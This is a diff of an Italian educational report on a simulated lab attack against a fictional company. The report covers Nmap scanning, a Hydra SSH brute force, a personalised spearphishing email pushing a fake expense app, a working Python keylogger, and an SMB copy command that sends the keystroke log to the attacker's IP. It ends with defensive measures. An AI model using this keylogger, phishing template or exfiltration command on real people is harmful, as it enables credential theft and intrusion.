@@ -1,14 +1,18 @@
 # La Morsa del Cyber Crimine: Esplorazione di un Attacco Multi-Fase, da Spearphishing a Furto di Dati
 
-## Introduzione 
+## Introduzione
 
 ### Contesto e Importanza della Cybersecurity
 
-Le minacce cyber sono in continua evoluzione e possono avere conseguenze devastanti sulla privacy, sull'integrità dei dati e sulla reputazione delle aziende. Tra le varie tecniche utilizzate dagli attaccanti, gli attacchi di spearphishing, l'iniezione di keylogger, il furto di credenziali e la divulgazione di informazioni sono tra i più pericolosi e diffusi.
+Le minacce cyber sono in continua evoluzione e possono avere conseguenze devastanti sulla privacy, sull'integrità dei dati e sulla reputazione delle aziende. Tra le varie tecniche utilizzate dagli attaccanti, spearphishing, furto di credenziali e divulgazione di informazioni sono tra i più pericolosi e diffusi.
 
 ### Obiettivo del Report
 
 L'obiettivo di questo report è analizzare dettagliatamente un attacco composto da diverse fasi: enumerazione, spearphishing, iniezione di un keylogger, furto di credenziali e esfiltrazione di informazioni.
+
+### Strumenti utilizzati
+
+ Gli strumenti utilizzati per eseguire l'attacco comprendono Kali Linux e una macchina virtuale Windows 10 su VirtualBox.
 
 ### Descrizione dell'attacco
 
@@ -32,7 +36,7 @@ Gli attaccanti utilizzano diverse tecniche per raccogliere informazioni durante 
 
 ### Scoperte nella fase di enumerazione
 
-Supponiamo che un attaccante voglia colpire un'azienda del settore finanziario di nome "Finanza Viva". Durante la fase di enumerazione, l'attaccante può utilizzare LinkedIn per identificare un dipendente chiave, ad esempio un analista finanziario e, monitorando i suoi profili social, l'attaccante scopre che questo dipendente è particolarmente interessato agli investimenti e alle criptovalute. 
+Supponiamo che un attaccante voglia colpire un'azienda del settore finanziario di nome "Finanza Viva". Durante la fase di enumerazione, l'attaccante può utilizzare LinkedIn per identificare un dipendente chiave, ad esempio un analista finanziario e, monitorando i suoi profili social, l'attaccante scopre che questo dipendente è particolarmente interessato agli investimenti e alle criptovalute.
 Dopo aver identificato l'azienda l'attaccante procede con la scansione della rete utilizzando Nmap. Supponiamo che l'attaccante trovi l'indirizzo IP 10.0.2.4 associato all'azienda.
 
 Utilizzando Nmap:
@@ -47,22 +51,21 @@ La fase di enumerazione è cruciale perché fornisce all'attaccante le informazi
 
 ## Fase 1: Valid Account
 
-Dopo aver identificato i servizi SSH e SMB aperti sulla rete dell'azienda "Finanza Viva", l'attaccante procede con l'utilizzo di Hydra per effettuare un attacco di forza bruta e ottenere accesso ai sistemi. L'attaccante usa un dizionario costruitosi di nomi utenti e di password per trovare le credenziali del servizio SSH.
+Dopo aver identificato i servizi SSH e SMB aperti sulla rete dell'azienda "Finanza Viva", l'attaccante procede con l'utilizzo di Hydra per effettuare un attacco di forza bruta contro il servizio SSH all'indirizzo IP 10.0.2.4 e ottenere accesso ai sistemi. L'attaccante usa un dizionario costruitosi di nomi utenti User e di password Password per trovare le credenziali del servizio SSH.
 
 ![Descrizione immagine](./images/hydra.png)
 
-L'attaccante scopre l'uso di credenziali predefinite da parte dell'amministratore, inseguito procede con l'autenticazione a SSH.
+L'attaccante scopre l'uso di credenziali predefinite da parte dell'amministratore, e procede con l'autenticazione a SSH.
 
 ![Descrizione immagine](./images/Inizio_SSH.png)
 
-
-L'attaccante ottiene una shell nell'dispositivo dell'azienda con l'identità dell'amministratore. L'attaccante naviga tra i file e scopre l'esistenza di un altro utente: 
+L'attaccante ottiene l'accesso alla shell nell'dispositivo dell'azienda con l'identità dell'amministratore. Quindi l'attaccante naviga tra i file e scopre l'esistenza di un altro utente:
 
 ![Descrizione immagine](./images/Discover_utenti.png)
 
 L'attaccante scopre la presenza di un altro utente: Alessandro. Tra i documenti del bersaglio l'attaccante trova le informazioni di contatto dell'utente come la mail. L'attaccante ritorna alla fase di enumerazione e attraverso LinkedIn scopre che Alessandro è un grande fan della finanza e all'interno della azienza è il responsabile della gestione dei conti bancari.
 
-### Importanza per l'Attacco
+### Importanza per l'attacco
 
 La scoperta delle credenziali dell'amministratore e l'utilizzo di Hydra per condurre un attacco di forza bruta sono cruciali per l'attaccante. Ottenere l'accesso come amministratore consente all'attaccante di eseguire operazioni dannose all'interno della rete, come il furto di dati sensibili, la modifica delle configurazioni di sistema o l'infiltrazione di malware.
 
@@ -70,14 +73,13 @@ Inoltre, l'utilizzo delle credenziali predefinite "Amministratore" e "Password" 
 
 ## Fase 2: Spearphishing e Iniezione di un Keylogger
 
-### Metodologia
-
-L'attaccante utilizza le informazioni raccolte su Alessandro, un dipendente di "Finanza Viva" noto per il suo interesse nella finanza e negli investimenti, per creare un'email altamente personalizzata. L'email finge di provenire da una rinomata azienda del settore finanziario che propone di testare in esclusiva una nuova applicazione di gestione della spesa. L'attaccante ha scoperto l'indirizzo email di Alessandro e decide di inviare il seguente messaggio:
+Lo spearphishing è una forma di phishing mirata in cui l'attaccante invia email fraudolente a individui specifici all'interno di un'organizzazione, utilizzando informazioni raccolte durante la fase di enumerazione per rendere l'email più credibile.
+L'attaccante utilizza le informazioni raccolte su Alessandro, un dipendente di "Finanza Viva" noto per il suo interesse nella finanza e negli investimenti, per creare un'email altamente personalizzata. L'email finge di provenire da una rinomata azienda del settore finanziario che propone di testare in esclusiva una nuova applicazione di gestione della spesa. L'attaccante decide di inviare il seguente messaggio al bersaglio:
 
 <blockquote>
 Da: Staff@gestoredispesa.com
 
-A: Alessandro@finanzaviva.com
+A: <Alessandro@finanzaviva.com>
 
 Oggetto: Partecipazione Esclusiva al Test del Nuovo Software di Gestione delle Spese
 
@@ -99,7 +101,7 @@ Il Team di Gestione delle Spese
 
 </blockquote>
 
-In allegato all'email, c'è un file eseguibile chiamato "Gestore di spesa.exe".
+In allegato all'email, c'è un programma di nome "Gestore di spesa.exe" che è un file malevolo.
 
 ### Tecniche Utilizzate
 
@@ -109,7 +111,7 @@ In allegato all'email, c'è un file eseguibile chiamato "Gestore di spesa.exe".
 
 ### Funzionamento del Software Malevolo
 
-Alessandro scarica e avvia il programma "Gestore_di_spesa.exe". Il programma si presenta come una legittima applicazione di gestione delle spese, consentendo all'utente di inserire e monitorare entrate e uscite. 
+Alessandro scarica e avvia il programma "Gestore_di_spesa.exe". Il programma si presenta come una legittima applicazione di gestione delle spese, consentendo all'utente di inserire e monitorare entrate e uscite.
 
 ![Descrizione immagine](./images/Wapp.png)
 
@@ -141,9 +143,9 @@ with Listener(on_press=on_press) as listener:
     listener.join()
 ```
 
-Questo codice rappresenta un esempio di un keylogger scritto in Python, che registra tutti i tasti premuti e li salva in un file log.txt nella cartella dell'utente.
+Questo codice rappresenta un esempio di un keylogger scritto in Python, che registra tutti i tasti premuti e li salva in un file log.txt nella cartella C:\Windows\Temp.
 
-Dopo la chiusura dell'applicazione, si può notare come nella gestione delle attività sia in esecuzione il Gestore di spesa:
+Dopo la chiusura dell'applicazione, si può notare come in gestione delle attività sia in esecuzione il Gestore di spesa in background:
 
 ![Descrizione immagine](./images/Gestattsp.png)
 
@@ -157,22 +159,21 @@ Dopo aver chiuso il programma, il keylogger inizia a catturare tutte le informaz
 
 ### Implicazioni e Impatti
 
-Un attacco di spearphishing riuscito porta Alessandro a cliccare sul link e scaricare la falsa applicazione, che in realtà è un keylogger. Una volta installato, il keylogger cattura tutte le informazioni digitate esfiltrate poi dall'attaccante. Questo può portare all'accesso non autorizzato ai sistemi aziendali di "Finanza Viva", dei conti bancari e di qualsiasi altro servizio fondamentale all'azienza.
+L'installazione del programma malevolo può portare all'accesso non autorizzato ai sistemi aziendali di "Finanza Viva", dei conti bancari e di qualsiasi altro servizio fondamentale all'azienza. Può avere conseguenze devastanti: furto di credenziali, compromissione di dati sensibili e danni reputazionali.
 
 ## Fase 3: Estrazione Dati tramite SMB
 
-### Metodologia
 Dopo aver iniettato un keylogger nel sistema di Alessandro e aver raccolto i dati sensibili, l'attaccante sfrutta il protocollo SMB per estrarre il file log.txt contenente le sequenze di tasti catturate.
 
 ### 1. Configurazione del Server SMB sull'Attaccante
+
 L'attaccante configura il server SMB utilizzando lo strumento impacket-smbserver per creare una condivisione di rete, tra il dispositivo del bersaglio e il proprio, che può essere acceduta dall'attaccante per copiare i file del bersaglio sul dispositivo dell'attaccante. Il comando seguente avvia il server SMB sul dispositivo dell'attaccante:
 
 ![Descrizione immagine](./images/Inizio_SMB.jpg)
 
-
 Questo comando crea una condivisione SMB denominata hax nella directory corrente dell'attaccante in cui l'attaccante può spostare i file della vittima.
 
-### 2. Navigazione sulla Macchina della Vittima 
+### 2. Navigazione sulla Macchina della Vittima
 
 Sulla macchina della vittima (il dispositivo di Alessandro), l'attaccante verifica la posizione del file log.txt generato dal keylogger. Il file è collocato nella directory C:\Windows\temp per costruzione del keylogger.
 
@@ -188,18 +189,28 @@ copy C:\Windows\temp\log.txt \\10.0.2.15\hax\log.txt
 
 ![Descrizione immagine](./images/Dopocopia.png)
 
-
 Dove 10.0.2.15 è l'indirizzo IP del dispositivo dell'attaccante.
 
 L'attaccante può verificare che lo spostamento del file è avvenuto nel terminale che ha usato creare la condivisione SMB:
 
 ![Descrizione immagine](./images/verificata_connessione.png)
 
+## Conclusioni
 
+Le aziende devono adottare misure di sicurezza efficaci e formare i propri dipendenti per prevenire e mitigare tali attacchi. Per proteggersi da questo tipo di attacco, le aziende possono adottare diverse misure di sicurezza:
 
-## Fase 4: Conclusioni
++ Gestione delle Password: Cambiare le password di default e utilizzare password non comuni e possibilmente non esistenti nei dizionari.
++ Formazione dei Dipendenti: Educare i dipendenti sui rischi del phishing e su come riconoscere email sospette.
++ Monitoraggio del Traffico di Rete: Monitorare e analizzare il traffico di rete per rilevare attività sospette.
++ Configurazione di Firewall e Regole di Accesso: Limitare l'accesso ai servizi SMB solo a dispositivi e utenti autorizzati.
 
+## Riferimenti
 
+1. Nmap:
+    + Nmap Official Website: https://nmap.org/
 
-## Fase 8: Riferimenti
+2. Hydra:
+    + van Hauser, "Hydra - A very fast network logon cracker," THC, 2023. Disponibile: https://github.com/vanhauser-thc/thc-hydra
 
+3. Trasferimento di file da e verso il server SMB dell'utente malintenzionato:
+    + https://juggernaut-sec.com/windows-file-transfers-for-hackers/#Transferring_Files_to_and_from_Attackers_SMB_Server
